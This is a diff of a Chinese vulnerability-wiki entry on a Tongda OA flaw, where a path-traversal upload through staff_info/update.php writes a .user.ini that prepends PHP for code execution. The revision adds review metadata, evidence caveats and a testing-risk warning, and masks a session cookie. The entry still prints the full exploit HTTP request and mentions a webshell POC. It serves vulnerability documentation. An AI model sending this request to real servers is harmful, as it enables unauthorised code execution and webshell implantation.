@@ -1,27 +1,67 @@
 ---
-version: "通达OA < v11.8"
 source: "Threekiii/Vulnerability-Wiki"
+title: "通达OA staff_info写.user.ini/PHP执行"
+product: "通达OA"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "11.6测试，11.7/11.8后补绕过，与<11.8字段矛盾"
+prerequisites: "后台Cookie，后触发可无Cookie"
+side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
+review_date: "2026-10-02"
+source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11.8-update.php-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+category_recommendation: "OA / 通达"
+id: "vw-1656c3538b1a4005b7aa8b17"
+entity_id: "ve-1656c3538b1a4005b7aa8b17"
+schema_version: "1"
 ---
 
-# 通达OA v11.8 update.php 后台文件包含命令执行漏洞
+# 通达OA staff_info写.user.ini/PHP执行
 
-## 漏洞描述
+## 条目说明
+
+- 对象与具体问题：通达OA；staff_info写.user.ini/PHP执行
+- 版本、配置及部署条件：11.6测试，11.7/11.8后补绕过，与<11.8字段矛盾
+- 认证与权限前提：后台Cookie，后触发可无Cookie
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 两大脚本近重复，仅命名和载荷变体，合并保留版本差异
+- PHP执行与OS命令混称，应列SAPI/user_ini/disable_functions条件
+- 路径双包含解释错误；混合斜线及固定Cookie；PeiQi/test变体需统一
+
+## 操作风险
+
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+### 漏洞描述
 
 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有PHP语句的文件导致命令执行
 
-## 漏洞影响
+### 漏洞影响
 
 ```
 通达OA < v11.8
 ```
 
-## 环境搭建
+### 环境搭建
 
 [通达OA v11.6下载链接](https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe)
 
 下载完毕点击安装即可
 
-## 漏洞复现
+### 漏洞复现
 
 这里使用的环境为通达 v11.6版本
 
@@ -83,7 +123,7 @@ auto_prepend_file=peiqi.log
 
 请求包为
 
-```plain
+```http
 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1
 Host: 192.168.1.105
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
@@ -91,9 +131,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
-Content-Length: 365
 Connection: close
-Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31
+Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=k************************4; SID_1=a63eb31
 Upgrade-Insecure-Requests: 1
 
 -----------------------------17518323986548992951984057104
@@ -107,6 +146,8 @@ Content-Disposition: form-data; name="submit"
 提交
 -----------------------------17518323986548992951984057104--
 ```
+
+> 请求长度说明：原资料 Content-Length 为 365；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 其中 **USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user** 为上传路径
 
@@ -134,7 +175,7 @@ Content-Disposition: form-data; name="submit"
 ![image-20220209112022434](./.resource/通达OA-v11.8-update.php-后台文件包含命令执行漏洞/media/202202091120543.png)
 
 
-## 漏洞POC
+### 漏洞POC
 
 脚本在 v11.6 测试成功执行， 在 v11.6以上执行时 这个webshell无法执行命令
 
